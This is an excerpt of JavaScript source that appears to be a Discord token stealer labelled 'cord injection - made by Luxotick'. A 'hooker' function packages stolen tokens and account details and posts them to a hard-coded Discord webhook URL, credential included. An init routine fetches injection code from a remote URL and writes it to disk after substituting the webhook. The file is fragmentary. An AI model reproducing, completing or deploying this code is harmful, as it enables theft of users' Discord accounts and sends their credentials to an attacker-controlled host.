...
const CONFIG = {
    webhook: "https://discord.com/api/webhooks/1400870486526791843/Of_MrGOkaexwV7gcThXyEB-zUaSjvN3J3_EtsHJXxxY8G0e_WXWymagairxlBf9f-Y0Q",
...
const hooker = async (content, token, account) => {
    ...
    content["username"] = "luxot - cord injection";
    content["avatar_url"] = "https://avatars.githubusercontent.com/u/76044365?v=4";
    ...
    content["embeds"][0]["footer"] = {
        "text": "discord injection - made by Luxotick",
        "icon_url": "hhttps://avatars.githubusercontent.com/u/76044365?v=4",
    };
...
async function initiation() {
  ...
  async function init() {
      https.get('${CONFIG.injection_url}', (res) => {
          ...
          res.replace('https://discord.com/api/webhooks/1400870486526791843/Of_MrGOkaexwV7gcThXyEB-zUaSjvN3J3_EtsHJXxxY8G0e_WXWymagairxlBf9f-Y0Q', '${CONFIG.webhook}')
          res.pipe(file);
          file.on('finish', () => {
              file.close();
          });
